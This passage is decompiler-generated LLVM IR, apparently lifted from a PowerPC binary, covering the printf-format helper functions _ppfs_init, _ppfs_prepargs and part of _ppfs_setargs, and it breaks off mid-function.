  uselistorder label %dec_label_pc_10009244, { 1, 0 }
  uselistorder label %dec_label_pc_10009224, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009224thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10009218, { 1, 0 }
  uselistorder label %dec_label_pc_100091a8, { 1, 0 }
  uselistorder label %dec_label_pc_10009194, { 1, 0 }
  uselistorder label %dec_label_pc_1000910c, { 1, 0 }
  uselistorder label %dec_label_pc_1000905c, { 1, 0 }
  uselistorder label %dec_label_pc_10009044, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_10008ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10008fd8, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10008f64, { 1, 0 }
  uselistorder label %dec_label_pc_10008f48, { 1, 0 }
  uselistorder label %dec_label_pc_10008f34, { 1, 0 }
  uselistorder label %dec_label_pc_10008f30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008f04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008e8c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10008e78.dec_label_pc_10008e78_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10008e50, { 1, 0 }
  uselistorder label %dec_label_pc_10008dec, { 1, 0 }
  uselistorder label %dec_label_pc_10008de0, { 1, 0 }
  uselistorder label %dec_label_pc_10008da4, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_100093a8 = load i32, i32* @lr, align 4
  store i32 %v0_100093a8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_100093b8 = load i32, i32* @r4, align 4
  store i32 %v0_100093b8, i32* @r30, align 4
  store i32 268473288, i32* @lr, align 4
  %v3_100093c4 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_100093c8 = load i32, i32* @r31, align 4
  %v1_100093c8 = add i32 %v0_100093c8, 24
  %v2_100093c8 = inttoptr i32 %v1_100093c8 to i32*
  %v3_100093c8 = load i32, i32* %v2_100093c8, align 4
  store i32 %v3_100093c8, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_100093d0 = load i32, i32* @r30, align 4
  %v2_100093d0 = inttoptr i32 %v0_100093c8 to i32*
  store i32 %v0_100093d0, i32* %v2_100093d0, align 4
  %v0_100093d4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100093d4, i32* %ctr.global-to-local, align 4
  %v0_100093d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100093d8 = add i32 %v0_100093d8, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_100093e0 = load i32, i32* @r31, align 4
  %v2_100093e0 = add i32 %v1_100093e0, 24
  %v3_100093e0 = inttoptr i32 %v2_100093e0 to i32*
  store i32 %v1_100093d8, i32* %v3_100093e0, align 4
  %v0_100093e4 = load i32, i32* @r31, align 4
  %v1_100093e4 = add i32 %v0_100093e4, 40
  store i32 %v1_100093e4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100093e8

dec_label_pc_100093e8:                            ; preds = %dec_label_pc_100093e8, %entry
  %v1_100093e8 = phi i32 [ %v1_100093ec, %dec_label_pc_100093e8 ], [ %v1_100093e4, %entry ]
  %v0_100093e8 = load i32, i32* %r0.global-to-local, align 4
  %v2_100093e8 = inttoptr i32 %v1_100093e8 to i32*
  store i32 %v0_100093e8, i32* %v2_100093e8, align 4
  %v0_100093ec = load i32, i32* %r9.global-to-local, align 4
  %v1_100093ec = add i32 %v0_100093ec, 4
  store i32 %v1_100093ec, i32* %r9.global-to-local, align 4
  %v0_100093f0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100093f0 = add i32 %v0_100093f0, -1
  store i32 %v1_100093f0, i32* %ctr.global-to-local, align 4
  %v2_100093f0 = icmp eq i32 %v1_100093f0, 0
  br i1 %v2_100093f0, label %dec_label_pc_100093f4, label %dec_label_pc_100093e8

dec_label_pc_100093f4:                            ; preds = %dec_label_pc_100093e8
  %v0_100093f4 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009434

dec_label_pc_10009404:                            ; preds = %dec_label_pc_10009434
  %v3_1000943c = icmp eq i8 %v2_10009434, 37
  br i1 %v3_1000943c, label %dec_label_pc_10009408, label %dec_label_pc_10009430

dec_label_pc_10009408:                            ; preds = %dec_label_pc_10009404
  %v1_10009408 = add i32 %v0_10009408, 1
  %v2_10009408 = inttoptr i32 %v1_10009408 to i8*
  %v3_10009408 = load i8, i8* %v2_10009408, align 1
  %v4_10009408 = zext i8 %v3_10009408 to i32
  store i32 %v4_10009408, i32* %r0.global-to-local, align 4
  store i32 %v1_10009408, i32* %r9.global-to-local, align 4
  %v3_10009410 = icmp eq i8 %v3_10009408, 37
  br i1 %v3_10009410, label %dec_label_pc_10009430, label %dec_label_pc_10009418

dec_label_pc_10009418:                            ; preds = %dec_label_pc_10009408
  %v0_1000940c = load i32, i32* @r31, align 4
  %v2_10009418 = inttoptr i32 %v0_1000940c to i32*
  store i32 %v1_10009408, i32* %v2_10009418, align 4
  store i32 268473376, i32* @lr, align 4
  %v1_1000941c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000941c = call i32 @_ppfs_parsespec(i32* %v2_10009418, i32 %v1_1000941c)
  %v1_10009420 = icmp slt i32 %v3_1000941c, 0
  br i1 %v1_10009420, label %dec_label_pc_1000944c, label %dec_label_pc_10009428

dec_label_pc_10009428:                            ; preds = %dec_label_pc_10009418
  %v0_10009428 = load i32, i32* @r31, align 4
  %v1_10009428 = inttoptr i32 %v0_10009428 to i32*
  %v2_10009428 = load i32, i32* %v1_10009428, align 4
  br label %dec_label_pc_10009434

dec_label_pc_10009430:                            ; preds = %dec_label_pc_10009404, %dec_label_pc_10009408
  %v0_10009430 = phi i32 [ %v0_10009408, %dec_label_pc_10009404 ], [ %v1_10009408, %dec_label_pc_10009408 ]
  %v1_10009430 = add i32 %v0_10009430, 1
  br label %dec_label_pc_10009434

dec_label_pc_10009434:                            ; preds = %dec_label_pc_10009428, %dec_label_pc_10009430, %dec_label_pc_100093f4
  %v0_10009408 = phi i32 [ %v0_100093f4, %dec_label_pc_100093f4 ], [ %v1_10009430, %dec_label_pc_10009430 ], [ %v2_10009428, %dec_label_pc_10009428 ]
  store i32 %v0_10009408, i32* %r9.global-to-local, align 4
  %v1_10009434 = inttoptr i32 %v0_10009408 to i8*
  %v2_10009434 = load i8, i8* %v1_10009434, align 1
  %v3_10009434 = zext i8 %v2_10009434 to i32
  store i32 %v3_10009434, i32* %r0.global-to-local, align 4
  %v3_10009438 = icmp eq i8 %v2_10009434, 0
  br i1 %v3_10009438, label %dec_label_pc_10009444, label %dec_label_pc_10009404

dec_label_pc_10009444:                            ; preds = %dec_label_pc_10009434
  %v0_10009444 = load i32, i32* @r30, align 4
  %v1_10009444 = load i32, i32* @r31, align 4
  %v2_10009444 = inttoptr i32 %v1_10009444 to i32*
  store i32 %v0_10009444, i32* %v2_10009444, align 4
  br label %dec_label_pc_1000944c

dec_label_pc_1000944c:                            ; preds = %dec_label_pc_10009418, %dec_label_pc_10009444
  %storemerge = phi i32 [ 0, %dec_label_pc_10009444 ], [ -1, %dec_label_pc_10009418 ]
  store i32 %v0_100093a8, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_10009434, { 1, 2, 0 }
  uselistorder i32 %v0_10009408, { 2, 3, 1, 0 }
  uselistorder i32 %v1_100093f0, { 1, 0 }
  uselistorder i32 %v1_100093ec, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000944c, { 1, 0 }
  uselistorder label %dec_label_pc_10009434, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009430, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10009460 = load i32, i32* @lr, align 4
  %v0_10009468 = load i32, i32* @r3, align 4
  store i32 %v0_10009468, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10009484 = add i32 %v0_10009468, 24
  %v2_10009484 = inttoptr i32 %v1_10009484 to i32*
  %v3_10009484 = load i32, i32* %v2_10009484, align 4
  store i32 %v3_10009484, i32* %r30.global-to-local, align 4
  %tmp4 = icmp slt i32 %v3_10009484, 1
  br i1 %tmp4, label %dec_label_pc_100094a8, label %dec_label_pc_10009490

dec_label_pc_10009490:                            ; preds = %entry
  %v2_10009490 = add i32 %v0_10009468, 8
  %v3_10009490 = inttoptr i32 %v2_10009490 to i32*
  store i32 0, i32* %v3_10009490, align 4
  %v0_10009494 = load i32, i32* %r30.global-to-local, align 4
  %v1_10009494 = load i32, i32* @r3, align 4
  %v2_10009494 = add i32 %v1_10009494, 28
  %v3_10009494 = inttoptr i32 %v2_10009494 to i32*
  store i32 %v0_10009494, i32* %v3_10009494, align 4
  %v0_10009498 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009498 = load i32, i32* @r3, align 4
  %v2_10009498 = add i32 %v1_10009498, 24
  %v3_10009498 = inttoptr i32 %v2_10009498 to i32*
  store i32 %v0_10009498, i32* %v3_10009498, align 4
  %v0_1000949c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000949c = load i32, i32* @r3, align 4
  %v2_1000949c = add i32 %v1_1000949c, 4
  %v3_1000949c = inttoptr i32 %v2_1000949c to i32*
  store i32 %v0_1000949c, i32* %v3_1000949c, align 4
  store i32 268473508, i32* @lr, align 4
  %v0_100094a0 = call i32 @_ppfs_setargs()
  store i32 %v0_100094a0, i32* %r3.global-to-local, align 4
  %v0_100094a4 = load i32, i32* %r30.global-to-local, align 4
  %v1_100094a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100094a4 = add i32 %v1_100094a4, 24
  %v3_100094a4 = inttoptr i32 %v2_100094a4 to i32*
  store i32 %v0_100094a4, i32* %v3_100094a4, align 4
  %v0_100094b8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100094a8

dec_label_pc_100094a8:                            ; preds = %entry, %dec_label_pc_10009490
  %v0_100094b8 = phi i32 [ %v0_10009468, %entry ], [ %v0_100094b8.pre, %dec_label_pc_10009490 ]
  store i32 %v0_10009460, i32* %r0.global-to-local, align 4
  ret i32 %v0_100094b8

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_100094a8, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_100094bc = load i32, i32* @r3, align 4
  %v1_100094bc = add i32 %v0_100094bc, 24
  %v2_100094bc = inttoptr i32 %v1_100094bc to i32*
  %v3_100094bc = load i32, i32* %v2_100094bc, align 4
  store i32 %v3_100094bc, i32* %r0.global-to-local, align 4
  %v1_100094c0 = add i32 %v0_100094bc, 88
  store i32 %v1_100094c0, i32* %r8.global-to-local, align 4
  %v1_100094c4 = add i32 %v0_100094bc, 8
  %v2_100094c4 = inttoptr i32 %v1_100094c4 to i32*
  %v3_100094c4 = load i32, i32* %v2_100094c4, align 4
  store i32 %v3_100094c4, i32* %r9.global-to-local, align 4
  %v2_100094c8 = icmp sgt i32 %v3_100094bc, 0
  %v3_100094c8 = icmp eq i32 %v3_100094bc, 0
  store i1 %v2_100094c8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_100094c8, label %dec_label_pc_100094d0, label %dec_label_pc_100096bc

dec_label_pc_100094d0:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_100094d4 = icmp ne i32 %v3_100094c4, -2147483648
  %v4_100094d4 = icmp eq i32 %v3_100094c4, -2147483648
  store i1 %v3_100094d4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_100094d4, label %dec_label_pc_100094dc, label %dec_label_pc_1000951c

dec_label_pc_100094dc:                            ; preds = %dec_label_pc_100094d0
  %v1_100094dc = add i32 %v0_100094bc, 76
  %v2_100094dc = inttoptr i32 %v1_100094dc to i8*
  %v3_100094dc = load i8, i8* %v2_100094dc, align 1
  %v4_100094dc = zext i8 %v3_100094dc to i32
  store i32 %v4_100094dc, i32* %r10.global-to-local, align 4
  store i32 %v1_100094dc, i32* %r11.global-to-local, align 4
  %v2_100094e4 = icmp ugt i8 %v3_100094dc, 8
  store i1 %v2_100094e4, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_100094dc, 7
  br i1 %tmp, label %dec_label_pc_10009504, label %dec_label_pc_100094ec

dec_label_pc_100094ec:                            ; preds = %dec_label_pc_100094dc
  %v1_100094ec = add i32 %v0_100094bc, 84
  %v2_100094ec = inttoptr i32 %v1_100094ec to i32*
  %v3_100094ec = load i32, i32* %v2_100094ec, align 4
  %v1_100094f0 = mul nuw nsw i32 %v4_100094dc, 4
  %v2_100094f4 = add i32 %v3_100094ec, %v1_100094f0
  store i32 %v2_100094f4, i32* %r9.global-to-local, align 4
  %v1_100094f8 = add nuw nsw i32 %v4_100094dc, 1
  store i32 %v1_100094f8, i32* %r0.global-to-local, align 4
  %v1_100094fc = trunc i32 %v1_100094f8 to i8
  store i8 %v1_100094fc, i8* %v2_100094dc, align 1
  br label %dec_label_pc_10009510

dec_label_pc_10009504:                            ; preds = %dec_label_pc_100094dc
  %v1_10009504 = add i32 %v0_100094bc, 80
  %v2_10009504 = inttoptr i32 %v1_10009504 to i32*
  %v3_10009504 = load i32, i32* %v2_10009504, align 4
  store i32 %v3_10009504, i32* %r9.global-to-local, align 4
  %v1_10009508 = add i32 %v3_10009504, 4
  store i32 %v1_10009508, i32* %r0.global-to-local, align 4
  store i32 %v1_10009508, i32* %v2_10009504, align 4
  br label %dec_label_pc_10009510

dec_label_pc_10009510:                            ; preds = %dec_label_pc_100094ec, %dec_label_pc_10009504
  %v0_10009510 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009510 = inttoptr i32 %v0_10009510 to i32*
  %v2_10009510 = load i32, i32* %v1_10009510, align 4
  store i32 %v2_10009510, i32* %r0.global-to-local, align 4
  %v1_10009514 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009514 = inttoptr i32 %v1_10009514 to i32*
  store i32 %v2_10009510, i32* %v2_10009514, align 4
  %v0_10009518 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009518 = load i32, i32* @r3, align 4
  %v2_10009518 = add i32 %v1_10009518, 8
  %v3_10009518 = inttoptr i32 %v2_10009518 to i32*
  store i32 %v0_10009518, i32* %v3_10009518, align 4
  %v0_1000951c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000951c

dec_label_pc_1000951c:                            ; preds = %dec_label_pc_100094d0, %dec_label_pc_10009510
  %v2_1000954c = phi i32 [ %v0_100094bc, %dec_label_pc_100094d0 ], [ %v0_1000951c.pre, %dec_label_pc_10009510 ]
  %v1_1000951c = add i32 %v2_1000954c, 4
  %v2_1000951c = inttoptr i32 %v1_1000951c to i32*
  %v3_1000951c = load i32, i32* %v2_1000951c, align 4
  store i32 %v3_1000951c, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_10009524 = icmp ne i32 %v3_1000951c, -2147483648
  %v4_10009524 = icmp eq i32 %v3_1000951c, -2147483648
  store i1 %v3_10009524, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10009524, label %dec_label_pc_1000952c, label %dec_label_pc_100096ac.preheader

dec_label_pc_1000952c:                            ; preds = %dec_label_pc_1000951c
  %v1_1000952c = add i32 %v2_1000954c, 76
  %v2_1000952c = inttoptr i32 %v1_1000952c to i8*
  %v3_1000952c = load i8, i8* %v2_1000952c, align 1
  %v4_1000952c = zext i8 %v3_1000952c to i32
  store i32 %v4_1000952c, i32* %r10.global-to-local, align 4
  store i32 %v1_1000952c, i32* %r11.global-to-local, align 4
  %v2_10009534 = icmp ugt i8 %v3_1000952c, 8
  store i1 %v2_10009534, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1000952c, 7
  br i1 %tmp22, label %dec_label_pc_10009554, label %dec_label_pc_1000953c

dec_label_pc_1000953c:                            ; preds = %dec_label_pc_1000952c
  %v1_1000953c = add i32 %v2_1000954c, 84
  %v2_1000953c = inttoptr i32 %v1_1000953c to i32*
  %v3_1000953c = load i32, i32* %v2_1000953c, align 4
  %v1_10009540 = mul nuw nsw i32 %v4_1000952c, 4
  %v2_10009544 = add i32 %v3_1000953c, %v1_10009540
  store i32 %v2_10009544, i32* %r9.global-to-local, align 4
  %v1_10009548 = add nuw nsw i32 %v4_1000952c, 1
  store i32 %v1_10009548, i32* %r0.global-to-local, align 4
  %v1_1000954c = trunc i32 %v1_10009548 to i8
  store i8 %v1_1000954c, i8* %v2_1000952c, align 1
  br label %dec_label_pc_10009560

dec_label_pc_10009554:                            ; preds = %dec_label_pc_1000952c
  %v1_10009554 = add i32 %v2_1000954c, 80
  %v2_10009554 = inttoptr i32 %v1_10009554 to i32*
  %v3_10009554 = load i32, i32* %v2_10009554, align 4
  store i32 %v3_10009554, i32* %r9.global-to-local, align 4
  %v1_10009558 = add i32 %v3_10009554, 4
  store i32 %v1_10009558, i32* %r0.global-to-local, align 4
  store i32 %v1_10009558, i32* %v2_10009554, align 4
  br label %dec_label_pc_10009560

dec_label_pc_10009560:                            ; preds = %dec_label_pc_1000953c, %dec_label_pc_10009554
  %v0_10009560 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009560 = inttoptr i32 %v0_10009560 to i32*
  %v2_10009560 = load i32, i32* %v1_10009560, align 4
  store i32 %v2_10009560, i32* %r0.global-to-local, align 4
  %v1_10009564 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009564 = inttoptr i32 %v1_10009564 to i32*
  store i32 %v2_10009560, i32* %v2_10009564, align 4
  %v0_10009568 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009568 = load i32, i32* @r3, align 4
  %v2_10009568 = add i32 %v1_10009568, 4
  %v3_10009568 = inttoptr i32 %v2_10009568 to i32*
  store i32 %v0_10009568, i32* %v3_10009568, align 4
  %v0_100096ac5.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100096ac.preheader

dec_label_pc_100096ac.preheader:                  ; preds = %dec_label_pc_1000951c, %dec_label_pc_10009560
  %v0_100096ac5 = phi i32 [ %v2_1000954c, %dec_label_pc_1000951c ], [ %v0_100096ac5.pre, %dec_label_pc_10009560 ]
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_100096ac6 = add i32 %v0_100096ac5, 28
  %v2_100096ac7 = inttoptr i32 %v1_100096ac6 to i32*
  %v3_100096ac8 = load i32, i32* %v2_100096ac7, align 4
  store i32 %v3_100096ac8, i32* %r0.global-to-local, align 4
  %v2_100096b09 = icmp sgt i32 %v3_100096ac8, 0
  %v3_100096b010 = icmp slt i32 %v3_100096ac8, 0
  store i1 %v3_100096b010, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100096b09, label %dec_label_pc_10009574, label %dec_label_pc_100096fc

dec_label_pc_10009574:                            ; preds = %dec_label_pc_100096ac.preheader, %dec_label_pc_100096a8
  %v2_10009688 = phi i32 [ %v0_100096ac, %dec_label_pc_100096a8 ], [ %v0_100096ac5, %dec_label_pc_100096ac.preheader ]
  %v0_10009574 = phi i32 [ %v1_100096a8, %dec_label_pc_100096a8 ], [ 0, %dec_label_pc_100096ac.preheader ]
  %v1_10009574 = mul i32 %v0_10009574, 4
  %v2_10009578 = add i32 %v1_10009574, %v2_10009688
  store i32 %v2_10009578, i32* %r9.global-to-local, align 4
  %v1_1000957c = add i32 %v2_10009578, 40
  %v2_1000957c = inttoptr i32 %v1_1000957c to i32*
  %v3_1000957c = load i32, i32* %v2_1000957c, align 4
  store i32 %v3_1000957c, i32* %r0.global-to-local, align 4
  %v2_10009580 = icmp sgt i32 %v3_1000957c, 8
  %v3_10009580 = icmp eq i32 %v3_1000957c, 8
  store i1 %v2_10009580, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10009580, label %dec_label_pc_100096a8, label %dec_label_pc_10009588

dec_label_pc_10009588:                            ; preds = %dec_label_pc_10009574
  %v1_10009588 = add i32 %v2_10009688, 76
  store i32 %v1_10009588, i32* %r10.global-to-local, align 4
  br i1 %v2_10009580, label %dec_label_pc_100095a4, label %dec_label_pc_10009590

dec_label_pc_10009590:                            ; preds = %dec_label_pc_10009588
  %v2_10009590 = icmp sgt i32 %v3_1000957c, 2
  store i1 %v2_10009590, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_1000957c, 3
  br i1 %tmp23, label %dec_label_pc_1000966c, label %dec_label_pc_100095bc

dec_label_pc_100095a4:                            ; preds = %dec_label_pc_10009588
  %v2_100095a4 = icmp sgt i32 %v3_1000957c, 1024
  store i1 %v2_100095a4, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_1000957c, 1025
  br i1 %tmp24, label %dec_label_pc_1000966c, label %dec_label_pc_100095b0

dec_label_pc_100095b0:                            ; preds = %dec_label_pc_100095a4
  %v2_100095b0 = icmp sgt i32 %v3_1000957c, 2048
  %v3_100095b0 = icmp eq i32 %v3_1000957c, 2048
  store i1 %v2_100095b0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_100095b0, label %dec_label_pc_100095c4, label %dec_label_pc_100095b8

dec_label_pc_100095b8:                            ; preds = %dec_label_pc_100095b0
  %v2_100095b8 = icmp sgt i32 %v3_1000957c, 2055
  %v3_100095b8 = icmp eq i32 %v3_1000957c, 2055
  store i1 %v2_100095b8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_100095b8, label %dec_label_pc_10009620, label %dec_label_pc_1000966c

dec_label_pc_100095bc:                            ; preds = %dec_label_pc_10009590
  %v3_1000959c = icmp eq i32 %v3_1000957c, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000959c, label %dec_label_pc_10009620, label %dec_label_pc_1000966c

dec_label_pc_100095c4:                            ; preds = %dec_label_pc_100095b0
  %v2_100095c4 = inttoptr i32 %v1_10009588 to i8*
  %v3_100095c4 = load i8, i8* %v2_100095c4, align 1
  %v4_100095c4 = zext i8 %v3_100095c4 to i32
  %v2_100095c8 = icmp ugt i8 %v3_100095c4, 6
  store i1 %v2_100095c8, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_100095c4, 2
  %v1_100095cc = zext i8 %tmp28 to i32
  store i32 %v1_100095cc, i32* %r9.global-to-local, align 4
  %v2_100095d0 = add nuw nsw i32 %v1_100095cc, %v4_100095c4
  store i32 %v2_100095d0, i32* %r0.global-to-local, align 4
  %v1_100095d4 = trunc i32 %v2_100095d0 to i8
  store i8 %v1_100095d4, i8* %v2_100095c4, align 1
  %v0_100095d8 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_100095d8, label %dec_label_pc_100095f8, label %dec_label_pc_100095dc

dec_label_pc_100095dc:                            ; preds = %dec_label_pc_100095c4
  %v0_100095dc = load i32, i32* %r0.global-to-local, align 4
  %v1_100095dc = urem i32 %v0_100095dc, 256
  store i32 %v1_100095dc, i32* %r9.global-to-local, align 4
  %v0_100095e0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100095e0 = add i32 %v0_100095e0, 8
  %v2_100095e0 = inttoptr i32 %v1_100095e0 to i32*
  %v3_100095e0 = load i32, i32* %v2_100095e0, align 4
  %v1_100095e4 = mul nuw nsw i32 %v1_100095dc, 4
  store i32 %v1_100095e4, i32* %r0.global-to-local, align 4
  %v1_100095e8 = add nuw nsw i32 %v1_100095dc, 2
  store i32 %v1_100095e8, i32* %r9.global-to-local, align 4
  %v2_100095ec = add i32 %v3_100095e0, %v1_100095e4
  store i32 %v2_100095ec, i32* %r11.global-to-local, align 4
  %v1_100095f0 = trunc i32 %v1_100095e8 to i8
  %v2_100095f0 = load i32, i32* @r3, align 4
  %v3_100095f0 = add i32 %v2_100095f0, 76
  %v4_100095f0 = inttoptr i32 %v3_100095f0 to i8*
  store i8 %v1_100095f0, i8* %v4_100095f0, align 1
  br label %dec_label_pc_1000960c

dec_label_pc_100095f8:                            ; preds = %dec_label_pc_100095c4
  %v0_100095f8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100095f8 = add i32 %v0_100095f8, 4
  %v2_100095f8 = inttoptr i32 %v1_100095f8 to i32*
  %v3_100095f8 = load i32, i32* %v2_100095f8, align 4
  %v1_100095fc = add i32 %v3_100095f8, 7
  store i32 %v1_100095fc, i32* %r9.global-to-local, align 4
  %v1_10009600 = call i32 @__asm_rlwinm(i32 %v1_100095fc, i32 0, i32 0, i32 28)
  store i32 %v1_10009600, i32* %r11.global-to-local, align 4
  %v1_10009604 = add i32 %v1_10009600, 8
  store i32 %v1_10009604, i32* %r0.global-to-local, align 4
  %v1_10009608 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009608 = add i32 %v1_10009608, 4
  %v3_10009608 = inttoptr i32 %v2_10009608 to i32*
  store i32 %v1_10009604, i32* %v3_10009608, align 4
  br label %dec_label_pc_1000960c

dec_label_pc_1000960c:                            ; preds = %dec_label_pc_100095dc, %dec_label_pc_100095f8
  %v0_1000960c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000960c = inttoptr i32 %v0_1000960c to i32*
  %v2_1000960c = load i32, i32* %v1_1000960c, align 4
  store i32 %v2_1000960c, i32* %r9.global-to-local, align 4
  %v1_10009610 = add i32 %v0_1000960c, 4
  %v2_10009610 = inttoptr i32 %v1_10009610 to i32*
  %v3_10009610 = load i32, i32* %v2_10009610, align 4
  store i32 %v3_10009610, i32* %r10.global-to-local, align 4
  %v1_10009614 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009614 = inttoptr i32 %v1_10009614 to i32*
  store i32 %v2_1000960c, i32* %v2_10009614, align 4
  %v0_10009618 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009618 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009618 = add i32 %v1_10009618, 4
  %v3_10009618 = inttoptr i32 %v2_10009618 to i32*
  store i32 %v0_10009618, i32* %v3_10009618, align 4
  br label %dec_label_pc_100096a4

dec_label_pc_10009620:                            ; preds = %dec_label_pc_100095b8, %dec_label_pc_100095bc
  store i32 %v1_10009588, i32* %r10.global-to-local, align 4
  %v1_10009624 = add i32 %v2_10009688, 77
  %v2_10009624 = inttoptr i32 %v1_10009624 to i8*
  %v3_10009624 = load i8, i8* %v2_10009624, align 1
  %v4_10009624 = zext i8 %v3_10009624 to i32
  store i32 %v4_10009624, i32* %r11.global-to-local, align 4
  %v2_10009628 = icmp ugt i8 %v3_10009624, 8
  store i1 %v2_10009628, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_10009624, 7
  br i1 %tmp25, label %dec_label_pc_1000964c, label %dec_label_pc_10009630

dec_label_pc_10009630:                            ; preds = %dec_label_pc_10009620
  %v1_10009630 = add i32 %v2_10009688, 84
  %v2_10009630 = inttoptr i32 %v1_10009630 to i32*
  %v3_10009630 = load i32, i32* %v2_10009630, align 4
  %v1_10009634 = mul nuw nsw i32 %v4_10009624, 8
  %v1_10009638 = add nuw nsw i32 %v1_10009634, 32
  %v2_1000963c = add i32 %v1_10009638, %v3_10009630
  store i32 %v2_1000963c, i32* %r9.global-to-local, align 4
  %v1_10009640 = add nuw nsw i32 %v4_10009624, 1
  store i32 %v1_10009640, i32* %r0.global-to-local, align 4
  %v1_10009644 = trunc i32 %v1_10009640 to i8
  store i8 %v1_10009644, i8* %v2_10009624, align 1
  br label %dec_label_pc_100096a4

dec_label_pc_1000964c:                            ; preds = %dec_label_pc_10009620
  %v1_1000964c = add i32 %v2_10009688, 80
  %v2_1000964c = inttoptr i32 %v1_1000964c to i32*
  %v3_1000964c = load i32, i32* %v2_1000964c, align 4
  %v1_10009650 = add i32 %v3_1000964c, 7
  store i32 %v1_10009650, i32* %r9.global-to-local, align 4
  %v1_10009654 = call i32 @__asm_rlwinm(i32 %v1_10009650, i32 0, i32 0, i32 28)
  store i32 %v1_10009654, i32* %r9.global-to-local, align 4
  %v1_10009658 = add i32 %v1_10009654, 8
  store i32 %v1_10009658, i32* %r0.global-to-local, align 4
  %v1_1000965c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000965c = add i32 %v1_1000965c, 4
  %v3_1000965c = inttoptr i32 %v2_1000965c to i32*
  store i32 %v1_10009658, i32* %v3_1000965c, align 4
  br label %dec_label_pc_100096a4

dec_label_pc_1000966c:                            ; preds = %dec_label_pc_100095b8, %dec_label_pc_100095bc, %dec_label_pc_100095a4, %dec_label_pc_10009590
  %v2_1000966c = inttoptr i32 %v1_10009588 to i8*
  %v3_1000966c = load i8, i8* %v2_1000966c, align 1
  %v4_1000966c = zext i8 %v3_1000966c to i32
  store i32 %v4_1000966c, i32* %r11.global-to-local, align 4
